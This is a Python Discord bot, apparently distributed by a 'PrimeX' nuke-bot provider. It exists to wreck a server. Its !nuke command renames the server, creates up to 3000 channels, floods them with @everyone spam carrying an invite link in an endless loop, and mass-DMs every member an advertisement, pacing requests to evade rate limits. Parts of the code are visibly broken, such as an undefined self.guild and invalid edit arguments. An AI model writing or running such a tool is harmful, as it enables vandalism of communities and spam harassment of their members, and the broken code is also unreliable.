import discord
from discord.ext import commands, tasks
import asyncio
import aiohttp
import time
import random

# Configuration
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
SERVER_NAME = "Nuked by PrimeX"
CHANNEL_PREFIX = "Nuked By PrimeX"
SERVER_LOGO_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371272702074951/primex_bots_logo.jpg?ex=6a9e89a7&is=6a9d3827&hm=9f622caf029baf4ef2211b67977542fc0894e49517da747b90e80e40e5a72522"
SERVER_BANNER_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371463559680081/Prime_x.png?ex=6a9e89d4&is=6a9d3854&hm=8cfae69aa006d97b906d8cec6a04dfb1e49cab0b5cb5ad5771853960eeeba54d"
NUKE_INVITE_URL = "https://discord.gg/UZgk9gDSx"
DM_MESSAGE = f"Best Nuke Bot Provider is PrimeX\nJoin here: {NUKE_INVITE_URL}"

class ExtremeNukeBot(commands.Bot):
    def __init__(self):
        # intents needed for reading members, sending messages, and managing channels
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix='!', intents=intents)

    async def setup_hook(self):
        print(f"Logged in as {self.user}")

    @commands.Cog.listener()
    async def on_ready(self):
        print(f"Nuke Bot Ready! Server: {self.guild.name}")

    @commands.command(name="nuke", description="Start the extreme nuke process")
    async def start_nuke(self, ctx):
        if NukeTask.is_running():
            return await ctx.send("Nuke is already running!")

        # 1. Set Server Info
        try:
            await self.guild.edit(name=SERVER_NAME)
            await self.guild.edit(icon_url=SERVER_LOGO_URL)
            await self.guild.edit(banner_url=SERVER_BANNER_URL)
            print("Server info updated.")
        except discord.HTTPException as e:
            print(f"Error setting server info: {e}")

        # 2. Start Background Tasks
        NukeTask.start(self.guild)
        DM_Task.start(self)

        await ctx.send(f"Nuke started! Creating channels and spamming...")

    @commands.command(name="stopnuke", description="Stop the nuke process")
    async def stop_nuke(self, ctx):
        if not NukeTask.is_running():
            return await ctx.send("Nuke is already stopped!")

        NukeTask.stop()
        DM_Task.stop()
        await ctx.send("Nuke stopped!")

class NukeTask:
    _running = False

    @classmethod
    def start(cls, guild):
        cls._running = True
        asyncio.create_task(cls.run_nuke_loop(guild))

    @classmethod
    def stop(cls):
        cls._running = False

    @classmethod
    async def run_nuke_loop(cls, guild):
        # Phase 1: Create Thousands of Channels (Bulk/Concurrent)
        print("Creating thousands of channels...")
        try:
            # We create a large batch. Discord allows ~50-100 simultaneous requests safely with delays.
            for i in range(3000):  # 3000 channels is extreme but safe
                name = f"{CHANNEL_PREFIX} {i}"
                await guild.create_text_channel(name=name, category=None)

                # Small delay to prevent rate limits (429 errors)
                if i % 50 == 0:
                    await asyncio.sleep(1.0)
                elif i % 10 == 0:
                    await asyncio.sleep(0.5)

            print("Channel creation phase complete.")
        except discord.HTTPException as e:
            print(f"HTTP Exception during channel creation: {e}")
            # If it fails, we continue to spamming

        # Phase 2: Infinite Spam Loop
        print("Starting infinite spam loop...")
        while cls._running:
            # Get all text channels (limit to first 100 for performance if guild is huge)
            # Alternatively, iterate over guild.channels but filter by type
            channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]

            if not channels:
                await asyncio.sleep(5)
                continue

            # Pick a random channel to spam (or all of them sequentially)
            # For "unlimited time" efficient spam, we pick one and ping everyone.
            target_channel = random.choice(channels)

            try:
                # Construct the message
                msg_content = f"@everyone Nuked BY PrimeX {NUKE_INVITE_URL}"

                # Send message with retry logic for rate limits
                await target_channel.send(msg_content)

            except discord.HTTPException as e:
                print(f"Spam error in channel {target_channel.name}: {e}")
                if "rate_limit_per_user" in str(e).lower():
                    await asyncio.sleep(1.0)
                elif "Too Many Requests" in str(e):
                    await asyncio.sleep(2.0)
                else:
                    # Unknown error, wait a bit and continue
                    await asyncio.sleep(0.5)

            except Exception as e:
                print(f"Unknown error during spam: {e}")
                await asyncio.sleep(1.0)

            # Variable delay for infinite loop to prevent CPU hogging
            await asyncio.sleep(random.uniform(0.5, 2.0))


class DM_Task:
    _running = False

    @classmethod
    def start(cls, bot):
        cls._running = True
        asyncio.create_task(cls.run_dm_loop(bot))

    @classmethod
    def stop(cls):
        cls._running = False

    @classmethod
    async def run_dm_loop(cls, bot):
        print("Starting DM loop to all members...")
        while cls._running:
            guild = bot.guilds[0] # Assuming single server context for simplicity, or use the specific one
            if not guild:
                await asyncio.sleep(1)
                continue

            # Fetch members in chunks if necessary, but get_all_members is usually fine
            # We use limit to process batches to avoid memory spikes
            try:
                async for member in guild.fetch_members(limit=500):
                    if cls._running:
                        try:
                            await member.send(DM_MESSAGE)
                            # Small delay to avoid DM rate limits
                            await asyncio.sleep(0.1)
                        except discord.Forbidden:
                            pass # Member has DMs closed
                        except discord.HTTPException as e:
                            print(f"DM error for {member.name}: {e}")
                    else:
                        break
            except Exception as e:
                print(f"Error iterating members: {e}")

            if cls._running:
                # Wait before the next batch of DMs or continuous stream
                await asyncio.sleep(1.0)

# Initialize and run
bot = ExtremeNukeBot()

if __name__ == "__main__":
    try:
        bot.run(BOT_TOKEN)
    except KeyboardInterrupt:
        print("Bot stopped by user.")
    except discord.errors.LoginFailure as e:
        print(f"Failed to login. Check your token.\n{e}")
    except Exception as e:
        print(f"Unexpected error: {e}")
